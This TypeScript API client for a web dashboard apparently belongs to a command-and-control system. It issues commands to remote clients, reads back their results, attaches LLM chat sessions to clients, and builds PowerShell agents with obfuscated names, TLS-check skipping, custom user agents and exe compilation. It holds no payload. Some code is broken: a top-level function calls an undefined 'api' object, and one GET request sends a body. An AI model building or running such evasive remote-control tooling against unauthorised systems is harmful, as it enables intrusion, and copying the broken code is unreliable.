// ui-app/src/api.ts

export type User = {
  id: string
  username: string
  role: 'admin' | 'operator' | 'viewer'
  disabled?: boolean
}

export type LoginResponse = { access_token: string; user?: User }

export type ClientSummary = {
  id: string
  connected?: boolean
  last_seen_at?: string | null
  queued: number
  delivered: number
  completed: number
  total: number
}

export type InstructionStatus = 'queued' | 'delivered' | 'completed' | 'error'

export type Instruction = {
  id: string
  client_id: string
  status: InstructionStatus
  created_at?: string
  delivered_at?: string | null
  completed_at?: string | null
  command_plain?: string | null
}

export type ResultView = {
  id: string
  client_id: string
  status: InstructionStatus
  created_at?: string
  delivered_at?: string | null
  completed_at?: string | null
  plaintext?: string | null                 // keep for backwards compat if server ever returns raw text
  result_cipher_b64?: string | null
  result_plain_b64?: string | null          // <-- add this
}

// Updated LLM types to match backend schema
export type LlmConfig = {
  id: string
  name: string
  provider: 'openai' | 'anthropic' | string
  model: string
  temperature: number
  is_active: boolean  // Changed from 'active' to 'is_active'
  created_at?: string
  owner_user_id?: string
}

export type NewLlmConfig = {
  name: string
  provider: string
  model: string
  api_key: string
  temperature?: number
  is_active?: boolean  // Changed from 'active' to 'is_active'
}

// Updated Chat types to match new chat system
export type ChatSession = {
  id: string
  client_id: string
  llm_config_id: string | null
  system_prompt?: string
  created_at?: string
  message_count?: number
  last_message_at?: string | null
}

export type ChatRole = 'system' | 'user' | 'assistant' | 'tool'

export type ChatMessage = {
  id: string
  session_id: string
  role: ChatRole
  content: string
  tool_name?: string
  tool_args?: string
  created_at?: string
}

// Client Builder Types
export type BuildConfig = {
  client_id_prefix: string
  var_prefix: string
  function_prefix: string
  crypto_prefix: string
  interval_seconds: number
  skip_tls_verify: boolean
  debug_mode: boolean
  custom_user_agent: string
  obfuscation_level: 'low' | 'medium' | 'high'
  compression_level: number
}

export type ClientBuildRequest = {
  server_url: string
  auth_method: 'apikey' | 'username' | 'token'
  config: BuildConfig
  additional_params?: string
  download_format: 'ps1' | 'base64' | 'exe'
}

export type GeneratedNames = {
  variables: Record<string, string>
  functions: Record<string, string>
  constants: Record<string, string>
}

export type ClientBuildResponse = {
  success: boolean
  script_content: string
  generated_names: GeneratedNames
  build_id: string
  build_timestamp: string
  stats: Record<string, any>
  deployment_commands: Record<string, string>
}

export type ConnectivityTestResult = {
  success: boolean
  status_code?: number
  response_time_ms?: number
  server_reachable: boolean
  tls_valid?: boolean
  error?: string
  message: string
  details?: string
}

type FetchInitX = RequestInit & { retryOn401?: boolean }

export async function createMcpKey(data: { name: string }) {
  const res = await api.post("/mcp/keys", data);
  return res.data;
}

export class Api {
  baseUrl: string
  getToken: () => string | null
  onUnauthorized?: () => Promise<void> | void

  constructor(opts: { baseUrl?: string; getToken: () => string | null; onUnauthorized?: () => Promise<void> | void }) {
    this.baseUrl = (opts.baseUrl || '/').replace(/\/$/, '') || ''
    this.getToken = opts.getToken
    this.onUnauthorized = opts.onUnauthorized
  }

  // ----------------- Core fetch wrapper -----------------
  private async call(path: string, init?: RequestInit & { retryOn401?: boolean }) {
    const url = `${this.baseUrl}${path}`
    const headers: Record<string, string> = {
      'Content-Type': 'application/json',
      ...(init?.headers as any),
    }

    const tok = this.getToken()
    if (tok) headers['Authorization'] = `Bearer ${tok}`

    const doFetch = async (h = headers) => {
      const res = await fetch(url, { ...init, headers: h })
      if (!res.ok) throw new Error(`${res.status} ${res.statusText}`)
      const ct = res.headers.get('content-type') || ''
      if (ct.includes('application/json')) return res.json()
      return res.text()
    }

    try {
      return await doFetch()
    } catch (e: any) {
      // Single retry on 401 using provided refresh callback
      if (
        String(e?.message || '').startsWith('401') &&
        (init as any)?.retryOn401 !== false &&
        this.onUnauthorized
      ) {
        await this.onUnauthorized()
        const tok2 = this.getToken()
        const h2 = { ...headers }
        if (tok2) h2['Authorization'] = `Bearer ${tok2}`
        return await doFetch(h2)
      }
      throw e
    }
  }

  // ----------------- Auth -----------------
  login(username: string, password: string) {
    return this.call('/api/auth/token', {
      method: 'POST',
      body: JSON.stringify({ username, password }),
      retryOn401: false,
    }) as Promise<LoginResponse>
  }

  refresh() {
    return this.call('/api/auth/refresh', {
      method: 'POST',
      retryOn401: false,
    }) as Promise<LoginResponse>
  }

  tokenByApiKey(client_id: string, api_key: string) {
    return this.call('/api/auth/token-by-apikey', {
      method: 'POST',
      body: JSON.stringify({ client_id, api_key }),
      retryOn401: false,
    }) as Promise<{ access_token: string; kid: string }>
  }

  // ----------------- Users (admin) -----------------
  listUsers() {
    return this.call('/api/users') as Promise<User[]>
  }

  createUser(user: { username: string; password: string; role: User['role'] }) {
    return this.call('/api/users', { method: 'POST', body: JSON.stringify(user) })
  }

  updateUser(id: string, patch: Partial<Omit<User, 'id' | 'username'>>) {
    return this.call(`/api/users/${encodeURIComponent(id)}`, {
      method: 'PATCH',
      body: JSON.stringify(patch),
    })
  }

  resetPassword(id: string, password: string) {
    return this.call(`/api/users/${encodeURIComponent(id)}/password`, {
      method: 'POST',
      body: JSON.stringify({ password }),
    })
  }

  deleteUser(id: string) {
    return this.call(`/api/users/${encodeURIComponent(id)}`, { method: 'DELETE' })
  }

  // ----------------- Clients & Instructions -----------------
  clients() {
    return this.call('/api/clients') as Promise<{ clients: ClientSummary[] }>
  }

  listQueue(opts?: { client_id?: string; status?: InstructionStatus; limit?: number }) {
    const q: string[] = []
    if (opts?.client_id) q.push(`client_id=${encodeURIComponent(opts.client_id)}`)
    if (opts?.status) q.push(`status=${encodeURIComponent(opts.status)}`)
    if (opts?.limit) q.push(`limit=${opts.limit}`)
    const qs = q.length ? `?${q.join('&')}` : ''
    return this.call(`/api/list-queue${qs}`) as Promise<Instruction[]>
  }

  clientInstructions(client_id: string, opts?: { status?: InstructionStatus; limit?: number }) {
    const q: string[] = []
    if (opts?.status) q.push(`status=${encodeURIComponent(opts.status)}`)
    if (opts?.limit) q.push(`limit=${opts.limit}`)
    const qs = q.length ? `?${q.join('&')}` : ''
    return this.call(`/api/clients/${encodeURIComponent(client_id)}/instructions${qs}`) as Promise<Instruction[]>
  }

  issue(client_id: string, command: string) {
    return this.call('/api/issue-command', {
      method: 'POST',
      body: JSON.stringify({ client_id, command }),
    })
  }

  // Always request plaintext view
  result(id: string) {
    return this.call(`/api/results/${encodeURIComponent(id)}?plaintext=1`) as Promise<ResultView>
  }

  // ----------------- LLM Configs (Updated) -----------------
  llmConfigs() {
    return this.call('/api/llm/configs').then((response: any) => {
      // Handle both array and {configs: []} response formats
      const configs = Array.isArray(response) ? response : (response?.configs || [])
      return configs
    }) as Promise<LlmConfig[]>
  }

  llmCreate(cfg: NewLlmConfig) {
    // Ensure we send is_active instead of active
    const payload = {
      ...cfg,
      is_active: cfg.is_active ?? true  // Default to true if not specified
    }
    return this.call('/api/llm/configs', { method: 'POST', body: JSON.stringify(payload) })
  }

  llmActivate(id: string, isActive: boolean) {
    return this.call(`/api/llm/configs/${encodeURIComponent(id)}/activate`, {
      method: 'PATCH',  // Changed from POST to PATCH to match backend
      body: JSON.stringify({ is_active: isActive }),  // Use is_active instead of active
    })
  }

  llmDelete(id: string) {
    return this.call(`/api/llm/configs/${encodeURIComponent(id)}`, { method: 'DELETE' })
  }

  llmUsage(id: string) {
  return this.call(`/api/llm/configs/${encodeURIComponent(id)}/usage`) as Promise<{ 
    sessions_using: number;
    config_id: string;
    config_name: string;
  }>
  }

  llmUpdate(id: string, data: Partial<LlmConfig & { api_key?: string }>) {
  return this.call(`/api/llm/configs/${encodeURIComponent(id)}`, {
    method: 'PUT',
    body: JSON.stringify(data),
  })
  }

  llmDetachSessions(id: string) {
    return this.call(`/api/llm/configs/${encodeURIComponent(id)}/detach-sessions`, { method: 'POST' })
  }

  // ----------------- New Chat System -----------------
  // Create a new chat session
  chatCreateSession(client_id: string, llm_config_id: string, system_prompt?: string) {
    return this.call('/api/chat/sessions', {
      method: 'POST',
      body: JSON.stringify({ 
        client_id, 
        llm_config_id,
        system_prompt 
      }),
    }) as Promise<ChatSession>
  }

  // List chat sessions
  chatListSessions(client_id?: string) {
    const qs = client_id ? `?client_id=${encodeURIComponent(client_id)}` : ''
    return this.call(`/api/chat/sessions${qs}`).then((response: any) => {
      return response?.sessions || []
    }) as Promise<ChatSession[]>
  }

  // Get messages for a session
  chatGetMessages(session_id: string) {
    return this.call(`/api/chat/sessions/${encodeURIComponent(session_id)}/messages`).then((response: any) => {
      return response?.messages || []
    }) as Promise<ChatMessage[]>
  }

  // Send a message in a chat session
  chatSendMessage(session_id: string, message: string) {
    return this.call('/api/chat/message', {
      method: 'POST',
      body: JSON.stringify({ 
        session_id, 
        message 
      }),
    })
  }

  // Delete a chat session
  chatDeleteSession(session_id: string) {
    return this.call(`/api/chat/sessions/${encodeURIComponent(session_id)}`, { method: 'DELETE' })
  }

  // ----------------- Legacy Chat (deprecated, keeping for compatibility) -----------------
  chatCreate(client_id: string, llm_config_id: string) {
    return this.chatCreateSession(client_id, llm_config_id)
  }

  chatMessages(client_id: string, session_id: string) {
    return this.chatGetMessages(session_id)
  }

  chatSend(client_id: string, session_id: string, user_text: string) {
    return this.chatSendMessage(session_id, user_text).then(() => ({
      assistant_text: "Message sent successfully"
    }))
  }

  // ----------------- API Keys -----------------
  listApiKeys() {
    return this.call('/api/keys') as Promise<
      Array<{
        id: string
        key_id: string
        label?: string
        created_at?: string
        last_used_at?: string
        expires_at?: string
        revoked: boolean
      }>
    >
  }

  createApiKey(label?: string, ttl_minutes?: number) {
    const body: any = {}
    if (label) body.label = label
    if (typeof ttl_minutes === 'number') body.ttl_minutes = ttl_minutes
    return this.call('/api/keys', {
      method: 'POST',
      body: JSON.stringify(body),
    }) as Promise<{ token: string; key: any }>
  }

  revokeApiKey(id: string) {
    return this.call(`/api/keys/${encodeURIComponent(id)}`, { method: 'DELETE' }) as Promise<{ ok: boolean }>
  }

  // ----------------- Client Builder Methods -----------------
  
  // Generate a customized MCP client
  generateClient(request: ClientBuildRequest): Promise<ClientBuildResponse> {
    return this.call('/api/client-builder/generate', {
      method: 'POST',
      body: JSON.stringify(request)
    }) as Promise<ClientBuildResponse>
  }

  // Get predefined build configuration presets
  getBuildPresets(): Promise<Record<string, BuildConfig>> {
    return this.call('/api/client-builder/presets').then((response: any) => {
      return response?.presets || {}
    }) as Promise<Record<string, BuildConfig>>
  }

  // Validate a build configuration
  validateBuildConfig(config: BuildConfig): Promise<any> {
    return this.call('/api/client-builder/validate-config', {
      method: 'GET',
      body: JSON.stringify(config)
    })
  }

  // Test connectivity to target MCP server
  testServerConnectivity(serverUrl: string, skipTls: boolean = false): Promise<ConnectivityTestResult> {
    return this.call('/api/client-builder/test-connectivity', {
      method: 'POST',
      body: JSON.stringify({
        server_url: serverUrl,
        skip_tls: skipTls
      })
    }) as Promise<ConnectivityTestResult>
  }

  // Get reusable template fragments
  getTemplateFragments(): Promise<any> {
    return this.call('/api/client-builder/templates')
  }

  // Get compilation instructions for PowerShell to executable
  getCompilationInstructions(scriptContent: string, outputName: string): Promise<any> {
    return this.call('/api/client-builder/compile-to-exe', {
      method: 'POST',
      body: JSON.stringify({
        script_content: scriptContent,
        output_name: outputName
      })
    })
  }

  // Get client builder usage statistics
  getClientBuilderStats(): Promise<any> {
    return this.call('/api/client-builder/usage-stats')
  }

  // Health check for client builder service
  clientBuilderHealth(): Promise<any> {
    return this.call('/api/client-builder/health')
  }
}